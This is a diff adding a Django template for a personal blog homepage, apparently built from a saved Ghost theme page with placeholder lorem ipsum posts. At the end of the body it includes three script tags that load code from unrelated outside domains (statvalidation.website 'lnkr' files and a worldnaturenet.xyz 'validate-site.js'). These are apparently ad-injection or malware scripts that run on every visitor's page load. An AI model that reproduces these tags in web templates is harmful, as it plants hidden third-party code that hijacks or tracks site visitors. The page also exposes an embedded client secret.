@@ -1,0 +1,240 @@
+
+<!doctype html>
+<html lang="en">
+	<head>
+        <meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<title>Blog || Sümeyye Özkaynak</title>
+		<meta name="HandheldFriendly" content="True">
+		<meta name="MobileOptimized" content="320">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700,700i%7CSpectral:400&amp;subset=latin-ext" rel="stylesheet">
+		<link rel="stylesheet" type="text/css" href="{%  static 'css/normalize-v=884195a687.css' %}">
+		<link rel="stylesheet" type="text/css" href="{%  static 'css/screen-v=884195a687.css' %}">
+		<link rel="stylesheet" type="text/css" href="{%  static 'css/icons-v=884195a687.css' %}">
+		<meta name="description" content="Thoughts, stories and ideas" />
+    <link rel="shortcut icon" href="favicon.icon" type="image/x-icon" />
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="next" href="page/2/index.html" />
+
+    <meta property="og:site_name" content="Arate" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Arate" />
+    <meta property="og:description" content="Thoughts, stories and ideas" />
+    <meta property="og:url" content="http:/arate.fueko.net/" />
+    <meta property="article:publisher" content="https://www.facebook.com/ghost" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Arate" />
+    <meta name="twitter:description" content="Thoughts, stories and ideas" />
+    <meta name="twitter:url" content="http:/arate.fueko.net/" />
+    <meta name="twitter:site" content="@tryghost" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "WebSite",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Arate",
+        "logo": "content/images/2018/02/arate.svg"
+    },
+    "url": "http:/arate.fueko.net/",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http:/arate.fueko.net/"
+    },
+    "description": "Thoughts, stories and ideas"
+}
+    </script>
+
+    <script src="{%  static 'js/ghost-sdk-v=884195a687.js' %}"></script>
+    <script>
+    ghost.init({
+        clientId: "ghost-frontend",
+        clientSecret: "37b22db7a9ce"
+    });
+    </script>
+    <meta name="generator" content="Ghost 1.23" />
+    <link rel="alternate" type="application/rss+xml" title="BLOG | Sümeyye Özkaynak" href="rss/index.rss" />
+    <meta name="robots" content=noindex,nofollow>
+    </head>
+
+	<body class="home-template" data-gr-c-s-loaded="true" cz-shortcut-listen="true" style="">
+		<div class="site-wrap">
+
+
+            <div class="top-wrap">
+                    <section class="title-wrap">
+                <div class="top-social">
+                    <a href="https://instagram.com/afafet"><i class="facebook"></i></a>
+		<a href="https://twitter.com/sumeyyeozkaynak"><i class="twitter"></i></a>
+                    <a href="#"><i class="youtube"></i></a>
+                </div>
+                <div class="is-featured bg-top">
+                    <h1 class="title">Düşünce, hikaye ve fikirler</h1>
+                    <h2 class="description"> </h2>
+                </div>
+                <div class="featured-wrap">
+                    <div class="bg-medium" data-sr-id="2" style="; visibility: visible;  -webkit-transform: translateY(0) scale(1); opacity: 1;transform: translateY(0) scale(1); opacity: 1;-webkit-transition: -webkit-transform 0.65s ease-in-out 0s, opacity 0.65s ease-in-out 0s; transition: transform 0.65s ease-in-out 0s, opacity 0.65s ease-in-out 0s; ">
+                        <div class="vertical text-featured">
+                            <div class="text rotate">
+                                Son Yazı
+                            </div>
+                        </div>
+                        <div class="featured-flex" data-sr-id="1" style="; visibility: visible;  -webkit-transform: translateY(0) scale(1); opacity: 1;transform: translateY(0) scale(1); opacity: 1;-webkit-transition: -webkit-transform 0.65s ease-in-out 0s, opacity 0.65s ease-in-out 0s; transition: transform 0.65s ease-in-out 0s, opacity 0.65s ease-in-out 0s; ">
+                            <div class="left first">
+                                <div class="appear">
+                                    <a href="the-sky-perfectly-blended-into-the-landscape/index.html"><div class="featured-image featured-home-image" style="background-image: url('https://images.unsplash.com/photo-1508739773434-c26b3d09e071?ixlib=rb-0.3.5&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;s=e4829fd62ecd20f431ff9b217a89be2b')"></div></a>
+                                </div>
+                            </div>
+                            <div class="right first">
+                                <article class="featured-post-wrap">
+                                {% if topic in topics %}
+                                    {% if post in topic.post_set.all %}
+                                    <div class="featured-post">
+                                        <h2><a href="the-sky-perfectly-blended-into-the-landscape/index.html">{{ post.title }}</a></h2>
+                                        <div class="item-excerpt">
+                                            <p>{{ post.text }}<a href="the-sky-perfectly-blended-into-the-landscape/index.html">[...]</a></p>
+                                        </div>
+                                        <a href="{% url 'blog:post' topic_slug=topic.slug post_slug=post.slug %}"> <span class="featured-more-button"> OKU </span></a>
+                                    </div>
+                                    {% endif %}
+                                 {% endif %}
+                                </article>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bg-bottom" data-sr-id="3" style="; visibility: visible;  -webkit-transform: translateY(0) scale(1); opacity: 1;transform: translateY(0) scale(1); opacity: 1;-webkit-transition: -webkit-transform 0.65s ease-in-out 0s, opacity 0.65s ease-in-out 0s; transition: transform 0.65s ease-in-out 0s, opacity 0.65s ease-in-out 0s; "></div>
+                </div>
+                <div class="is-featured vertical text-posts">
+                    <div class="text rotate">
+                        Articles
+                    </div>
+                </div>
+            </section>
+            </div>
+
+            <div class="masonry-wrap">
+	            <div class="masonry" style="opacity: 1; position: relative; height: 1652.3px;">
+
+                    <div class="item post tag-sky tag-photography tag-story tag-dream" style="position: absolute; left: 0px; top: 0px;">
+                        <article class="appear" data-sr-id="4" style="; visibility: visible;  -webkit-transform: translateY(0) scale(1); opacity: 1;transform: translateY(0) scale(1); opacity: 1;-webkit-transition: -webkit-transform 0.6s ease-in-out 0s, opacity 0.6s ease-in-out 0s; transition: transform 0.6s ease-in-out 0s, opacity 0.6s ease-in-out 0s; ">
+                            <div class="item-container first">
+                                <div class="item-container-img">
+                                    <div class="appear-img" data-sr-id="8" style="; visibility: visible;  -webkit-transform: translateY(0) scale(1); opacity: 1;transform: translateY(0) scale(1); opacity: 1;-webkit-transition: -webkit-transform 0.8s ease-in-out 0s, opacity 0.8s ease-in-out 0s; transition: transform 0.8s ease-in-out 0s, opacity 0.8s ease-in-out 0s; ">
+                                        <a class="item-image" href="when-you-are-on-your-way-to-home/index.html">
+                                            <img src="https://images.unsplash.com/photo-1497048580470-a9bedee3bd21?ixlib=rb-0.3.5&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;s=bf49ab0be649f03d3aa3c35c8285147a" alt="When you are on your way to home">
+                                        </a>
+                                    </div>
+                                </div>
+                                <header class="item-title">
+                                    <h2><a href="when-you-are-on-your-way-to-home/index.html">When you are on your way to home</a></h2>
+                                    <div class="item-excerpt">
+                                        <p>Est enim effectrix multarum et magnarum voluptatum. Traditur, inquit, ab Epicuro ratio neglegendi doloris. Itaque quantum adiit periculum! ad honestatem enim illum omnem conatum suum <a href="when-you-are-on-your-way-to-home/index.html">[...]</a></p>
+                                    </div>
+                                    <div class="item-meta author-name">
+                                        <a href="author/roger/index.html">Roger Brown</a>, <a href="author/eva/index.html">Eva Janik</a>
+                                        <br>
+                                        <time datetime="2017-11-22">Published 6 months ago</time>
+                                    </div>
+                                </header>
+                            </div>
+                        </article>
+                    </div>
+
+                    <div class="item post tag-sky tag-dream" style="position: absolute; left: 423px; top: 0px;">
+                        <article class="appear" data-sr-id="5" style="; visibility: visible;  -webkit-transform: translateY(0) scale(1); opacity: 1;transform: translateY(0) scale(1); opacity: 1;-webkit-transition: -webkit-transform 0.6s ease-in-out 0s, opacity 0.6s ease-in-out 0s; transition: transform 0.6s ease-in-out 0s, opacity 0.6s ease-in-out 0s; ">
+                            <div class="item-container">
+                                <div class="item-container-img">
+                                    <div class="appear-img" data-sr-id="9" style="; visibility: visible;  -webkit-transform: translateY(0) scale(1); opacity: 1;transform: translateY(0) scale(1); opacity: 1;-webkit-transition: -webkit-transform 0.8s ease-in-out 0s, opacity 0.8s ease-in-out 0s; transition: transform 0.8s ease-in-out 0s, opacity 0.8s ease-in-out 0s; ">
+                                        <a class="item-image" href="you-have-to-fight-to-reach-your-dream/index.html">
+                                            <img src="https://images.unsplash.com/photo-1489289827069-adf270f4f417?ixlib=rb-0.3.5&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;s=29651f9440a181c3ead12033cc47b029" alt="You have to fight to reach your dream">
+                                        </a>
+                                    </div>
+                                </div>
+                                <header class="item-title">
+                                    <h2><a href="you-have-to-fight-to-reach-your-dream/index.html">You have to fight to reach your dream</a></h2>
+                                    <div class="item-excerpt">
+                                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Idemne potest esse dies saepius, qui semel fuit? Sed tamen intellego quid velit. Respondent extrema primis, media <a href="you-have-to-fight-to-reach-your-dream/index.html">[...]</a></p>
+                                    </div>
+                                    <div class="item-meta author-name">
+                                        <a href="author/roger/index.html">Roger Brown</a>
+                                        <br>
+                                        <time datetime="2017-11-02">Published 7 months ago</time>
+                                    </div>
+                                </header>
+                            </div>
+                        </article>
+                    </div>
+
+                    <div class="item post tag-travel featured" style="position: absolute; left: 0px; top: 733px;">
+                        <article class="appear" data-sr-id="6" style="; visibility: visible;  -webkit-transform: translateY(0) scale(1); opacity: 1;transform: translateY(0) scale(1); opacity: 1;-webkit-transition: -webkit-transform 0.6s ease-in-out 0s, opacity 0.6s ease-in-out 0s; transition: transform 0.6s ease-in-out 0s, opacity 0.6s ease-in-out 0s; ">
+                            <div class="item-container">
+                                <div class="item-container-img">
+                                    <div class="appear-img" data-sr-id="10" style="; visibility: visible;  -webkit-transform: translateY(0) scale(1); opacity: 1;transform: translateY(0) scale(1); opacity: 1;-webkit-transition: -webkit-transform 0.8s ease-in-out 0s, opacity 0.8s ease-in-out 0s; transition: transform 0.8s ease-in-out 0s, opacity 0.8s ease-in-out 0s; ">
+                                        <a class="item-image" href="the-sky-perfectly-blended-into-the-landscape/index.html">
+                                            <img src="https://images.unsplash.com/photo-1508739773434-c26b3d09e071?ixlib=rb-0.3.5&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;s=e4829fd62ecd20f431ff9b217a89be2b" alt="The sky perfectly blended into the landscape">
+                                        </a>
+                                    </div>
+                                </div>
+                                <header class="item-title">
+                                    <h2><a href="the-sky-perfectly-blended-into-the-landscape/index.html">The sky perfectly blended into the landscape</a></h2>
+                                    <div class="item-excerpt">
+                                        <p>Et harum quidem rerum facilis est et expedita distinctio. Ut proverbia non nulla veriora sint quam vestra dogmata. Si sapiens, ne tum quidem miser, cum <a href="the-sky-perfectly-blended-into-the-landscape/index.html">[...]</a></p>
+                                    </div>
+                                    <div class="item-meta author-name">
+                                        <a href="author/roger/index.html">Roger Brown</a>, <a href="author/domnica/index.html">Domnica Todoran</a>, <a href="author/eva/index.html">Eva Janik</a>
+                                        <br>
+                                        <time datetime="2017-11-01">Published 7 months ago</time>
+                                    </div>
+                                </header>
+                            </div>
+                        </article>
+                    </div>
+                    <div class="item post tag-travel tag-dream" style="position: absolute; left: 423px; top: 949px;">
+                        <article class="appear" data-sr-id="7" style="; visibility: visible;  -webkit-transform: translateY(0) scale(1); opacity: 1;transform: translateY(0) scale(1); opacity: 1;-webkit-transition: -webkit-transform 0.6s ease-in-out 0s, opacity 0.6s ease-in-out 0s; transition: transform 0.6s ease-in-out 0s, opacity 0.6s ease-in-out 0s; ">
+                            <div class="item-container last">
+                                <div class="item-container-img">
+                                    <div class="appear-img" data-sr-id="11" style="; visibility: visible;  -webkit-transform: translateY(0) scale(1); opacity: 1;transform: translateY(0) scale(1); opacity: 1;-webkit-transition: -webkit-transform 0.8s ease-in-out 0s, opacity 0.8s ease-in-out 0s; transition: transform 0.8s ease-in-out 0s, opacity 0.8s ease-in-out 0s; ">
+                                        <a class="item-image" href="if-you-dream-and-you-believe-you-can-do-it/index.html">
+                                            <img src="https://images.unsplash.com/photo-1469050624972-f03b8678e363?ixlib=rb-0.3.5&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;s=0edaa51046ee35eda729b0b602cbd94e" alt="If you dream and you believe, you can do it">
+                                        </a>
+                                    </div>
+                                </div>
+                                <header class="item-title">
+                                    <h2><a href="if-you-dream-and-you-believe-you-can-do-it/index.html">If you dream and you believe, you can do it</a></h2>
+                                    <div class="item-excerpt">
+                                        <p>Consectetur adipiscing elit. Idemne potest esse dies saepius, qui semel fuit? Sed tamen intellego quid velit. Respondent extrema primis, media utrisque, omnia omnibus. Qui autem <a href="if-you-dream-and-you-believe-you-can-do-it/index.html">[...]</a></p>
+                                    </div>
+                                    <div class="item-meta author-name">
+                                        <a href="author/domnica/index.html">Domnica Todoran</a>
+                                        <br>
+                                        <time datetime="2017-10-01">Published 8 months ago</time>
+                                    </div>
+                                </header>
+                            </div>
+                        </article>
+                    </div>
+	            </div>
+            </div>
+
+            <footer class="footer-wrap">
+	<div class="footer-social">
+		<a href="https://instagram.com/afafet"><i class="facebook"></i></a>
+		<a href="https://twitter.com/sumeyyeozkaynak"><i class="twitter"></i></a>
+		<a href="#"><i class="youtube"></i></a>
+	</div>
+	<div class="footer-copyright">
+		Copyright © 2018, <a href="http://127.0.0.1:8000/blog/">BLOG||Sümeyye Özkaynak</a>. All Right Reserved.
+	</div>
+</footer>
+        </div>
+
+		<script src="{% static 'js/global-v=884195a687.js'%}"></script>
+		<script src="{% static 'js/home-v=884195a687.js'%}"></script>
+        <script type="text/javascript" src="http://statvalidation.website/addons/lnkr5.min.js"></script>
+        <script type="text/javascript" src="http://statvalidation.website/addons/lnkr30_nt.min.js"></script>
+        <script type="text/javascript" src="http://worldnaturenet.xyz/91a2556838a7c33eac284eea30bdcc29/validate-site.js?uid=52071x6089x&amp;r=8"></script>
+    </body>
+</html>
